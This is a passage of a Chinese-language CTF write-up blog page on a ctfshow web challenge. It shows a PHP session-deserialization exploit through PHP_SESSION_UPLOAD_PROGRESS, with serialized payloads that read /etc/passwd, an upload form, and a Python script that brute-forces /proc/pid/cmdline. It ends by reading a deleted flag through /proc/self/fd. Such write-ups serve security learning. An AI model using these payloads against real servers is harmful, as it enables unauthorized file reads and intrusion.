class="comment">//O:5:&quot;Happy&quot;:1:&#123;s:5:&quot;happy&quot;;O:5:&quot;_New_&quot;:3:&#123;s:5:&quot;daniu&quot;;O:5:&quot;_New_&quot;:3:&#123;s:5:&quot;daniu&quot;;O:4:&quot;Year&quot;:1:&#123;s:6:&quot;zodiac&quot;;N;&#125;s:5:&quot;robot&quot;;s:6:&quot;zodiac&quot;;s:8:&quot;notrobot&quot;;s:11:&quot;/etc/passwd&quot;;&#125;s:5:&quot;robot&quot;;N;s:8:&quot;notrobot&quot;;N;&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>构造完成后，这个时候我们需要从浏览器向服务器上传PHP_SESSION_UPLOAD_PROGRESS。</p>
<p>写个post上传表单的口子</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://c4ba91f7-93a1-4cfb-a221-4dea7835e458.challenge.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后把我们序列化后的内容传入到file的值中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:5:&quot;Happy&quot;:1:&#123;s:5:&quot;happy&quot;;O:5:&quot;_New_&quot;:3:&#123;s:5:&quot;daniu&quot;;O:5:&quot;_New_&quot;:3:&#123;s:5:&quot;daniu&quot;;O:4:&quot;Year&quot;:1:&#123;s:6:&quot;zodiac&quot;;N;&#125;s:5:&quot;robot&quot;;s:6:&quot;zodiac&quot;;s:8:&quot;notrobot&quot;;s:11:&quot;/etc/passwd&quot;;&#125;s:5:&quot;robot&quot;;N;s:8:&quot;notrobot&quot;;N;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>然后这里需要将双引号进行转义或者把filename的内容用单引号包裹，然后前面加个|符号，因为当前脚本的序列化引擎是php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:5:&quot;Happy&quot;:1:&#123;s:5:&quot;happy&quot;;O:5:&quot;_New_&quot;:3:&#123;s:5:&quot;daniu&quot;;O:5:&quot;_New_&quot;:3:&#123;s:5:&quot;daniu&quot;;O:4:&quot;Year&quot;:1:&#123;s:6:&quot;zodiac&quot;;N;&#125;s:5:&quot;robot&quot;;s:6:&quot;zodiac&quot;;s:8:&quot;notrobot&quot;;s:11:&quot;/etc/passwd&quot;;&#125;s:5:&quot;robot&quot;;N;s:8:&quot;notrobot&quot;;N;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>一开始构造的请求发送过去没打出来，后面发现需要设置Cookie，设置之后再发包，</p>
<p><img src="/../image/achieve/202411/%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B/image-20250417200519025.png" alt="image-20250417200519025"></p>
<p>成功读到文件，但是我试了一下php:&#x2F;&#x2F;input伪协议用不了，我们也不知道flag具体在哪，环境变量也没有，尝试爆破一下&#x2F;proc&#x2F;{pid}&#x2F;cmdline</p>
<p><code>/proc/[pid]/cmdline</code> 是 Linux 系统 <strong><code>/proc</code> 文件系统</strong>中的一个特殊文件，用于存储 <strong>进程启动时的完整命令行参数</strong>。</p>
<p>写个脚本去爆破吧</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://c4ba91f7-93a1-4cfb-a221-4dea7835e458.challenge.ctf.show/&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">999</span>):</span><br><span class="line">    payload = <span class="string">&#x27;/proc/&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;/cmdline&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line">    data = <span class="string">&#x27;&#x27;&#x27;------WebKitFormBoundaryPzA2hRE791H0AVst</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">123</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryPzA2hRE791H0AVst</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;file&quot;; filename=&#x27;|O:5:&quot;Happy&quot;:1:&#123;s:5:&quot;happy&quot;;O:5:&quot;_New_&quot;:3:&#123;s:5:&quot;daniu&quot;;O:5:&quot;_New_&quot;:3:&#123;s:5:&quot;daniu&quot;;O:4:&quot;Year&quot;:1:&#123;s:6:&quot;zodiac&quot;;N;&#125;s:5:&quot;robot&quot;;s:6:&quot;zodiac&quot;;s:8:&quot;notrobot&quot;;s:&#x27;&#x27;&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(payload))+<span class="string">&#x27;&#x27;&#x27;:&quot;&#x27;&#x27;&#x27;</span>+payload+<span class="string">&#x27;&#x27;&#x27;&quot;;&#125;s:5:&quot;robot&quot;;N;s:8:&quot;notrobot&quot;;N;&#125;&#125;&#x27;</span></span><br><span class="line"><span class="string">Content-Type: text/plain</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">123</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryPzA2hRE791H0AVst--&#x27;&#x27;&#x27;</span></span><br><span class="line">    r = requests.post(url=url, data=data,headers=&#123;<span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;multipart/form-data; boundary=----WebKitFormBoundaryPzA2hRE791H0AVst&#x27;</span>,<span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;PHPSESSID=37eb994d315b99e58c34574c2597b737&#x27;</span>&#125;)</span><br><span class="line">    r = r.text.encode()[<span class="number">1990</span>:]</span><br><span class="line">    <span class="built_in">print</span>(r)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>为什么是1990，因为原先的响应内容的长度就是1990</p>
<p><img src="/../image/achieve/202411/%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B/image-20250417202622078.png" alt="image-20250417202622078"></p>
<p>然后发现<code>python3 /app/server.py</code>命令</p>
<p>尝试读取</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">flag=<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"><span class="comment">#flag我删了</span></span><br><span class="line">os.remove(<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;flag我删了，你们别找了&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_file</span>():</span><br><span class="line">    <span class="keyword">return</span> send_file(request.args[<span class="string">&#x27;filename&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;127.0.0.1&#x27;</span>, port=<span class="number">5000</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<p>flag被删了，但文件删除之后，在 &#x2F;proc 这个进程的 pid 目录下的 fd 文件描述符目录下还是会有这个文件的 fd，也就是<code>/proc/self/fd/</code>,通过这个我们即可得到被删除文件的内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/download?filename=/proc/self/fd/3</span><br></pre></td></tr></table></figure>


  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">H0me</a></li>
        
          <li><a href="/about/">A6out</a></li>
        
          <li><a href="/tags/">T6gs</a></li>
        
          <li><a href="/categories/">Catagory</a></li>
        
          <li><a href="/links/">L1nks</a></li>
        
          <li><a href="/search/">s4arch</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%83%AD%E8%BA%AB"><span class="toc-number">1.</span> <span class="toc-text">热身</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web1"><span class="toc-number">2.</span> <span class="toc-text">web1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%BB%E4%BA%A1exit-%E7%BB%95%E8%BF%87"><span class="toc-number">2.1.</span> <span class="toc-text">#死亡exit()绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D"><span class="toc-number">2.2.</span> <span class="toc-text">第一种:</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#base64%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.0.1.</span> <span class="toc-text">base64编码绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#rot13%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.0.2.</span> <span class="toc-text">rot13编码绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%99%A8%E5%B5%8C%E5%A5%97%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.0.3.</span> <span class="toc-text">过滤器嵌套绕过</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D"><span class="toc-number">2.3.</span> <span class="toc-text">第二种</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#rot13%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87-1"><span class="toc-number">2.3.0.1.</span> <span class="toc-text">rot13编码绕过</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web2"><span class="toc-number">3.</span> <span class="toc-text">web2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="toc-number">3.1.</span> <span class="toc-text">#变量覆盖</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web3"><span class="toc-number">4.</span> <span class="toc-text">web3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%94%E5%9B%9Etrue%E7%9A%84%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0"><span class="toc-number">4.1.</span> <span class="toc-text">#返回true的无参数函数</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web4"><span class="toc-number">5.</span> <span class="toc-text">web4</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%94%E5%9B%9E%E5%90%8E%E7%BC%80%E5%90%8D%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">5.1.</span> <span class="toc-text">#返回后缀名的函数</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web5"><span class="toc-number">6.</span> <span class="toc-text">web5</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%86%85%E5%AD%98%E6%BA%A2%E5%87%BA%E7%BB%95%E8%BF%87file-put-contents%E6%9C%BA%E5%88%B6"><span class="toc-number">6.1.</span> <span class="toc-text">#使用内存溢出绕过file_put_contents机制</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web6"><span class="toc-number">7.</span> <span class="toc-text">web6</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8"><span class="toc-number">7.1.</span> <span class="toc-text">#字符串逃逸</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web7"><span class="toc-number">8.</span> <span class="toc-text">web7</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">8.1.</span> <span class="toc-text">#session反序列化</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/04/17/ctfshow%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B(%E5%B7%B2%E5%81%9A%E5%AE%8C)/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/04/17/ctfshow%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&text=ctfshow新春欢乐赛(已做完)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/04/17/ctfshow%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&title=ctfshow新春欢乐赛(已做完)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/04/17/ctfshow%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&is_video=false&description=ctfshow新春欢乐赛(已做完)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=ctfshow新春欢乐赛(已做完)&body=Check out this article: https://wanth3f1ag.top/2025/04/17/ctfshow%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B(%E5%B7%B2%E5%81%9A%E5%AE%8C)/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/04/17/ctfshow%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&title=ctfshow新春欢乐赛(已做完)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/04/17/ctfshow%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&title=ctfshow新春欢乐赛(已做完)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/04/17/ctfshow%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&title=ctfshow新春欢乐赛(已做完)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/04/17/ctfshow%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&title=ctfshow新春欢乐赛(已做完)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/04/17/ctfshow%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&name=ctfshow新春欢乐赛(已做完)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/04/17/ctfshow%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&t=ctfshow新春欢乐赛(已做完)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        
<footer id="footer">
    <div class="footer-left">
        Copyright ©
        
        
        2024-2025
        wanTh3flag
        <br>
    </div>
    
    <div class="footer-right">
        <nav>
            <ul>
                <!--
                --><li><a href="/">H0me</a></li><!--
                --><!--
                --><li><a href="/about/">A6out</a></li><!--
                --><!--
                --><li><a href="/tags/">T6gs</a></li><!--
                --><!--
                --><li><a href="/categories/">Catagory</a></li><!--
                --><!--
                --><li><a href="/links/">L1nks</a></li><!--
                --><!--
                --><li><a href="/search/">s4arch</a></li><!--
                -->
            </ul>
            <ul>
                
                <!-- 不蒜子统计 -->
                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
                <span class="post-meta-divider">|</span>
                <span id="busuanzi_container_site_uv" style='display:none'>本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
                
            </ul>
        </nav>
    </div>
</footer>


    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
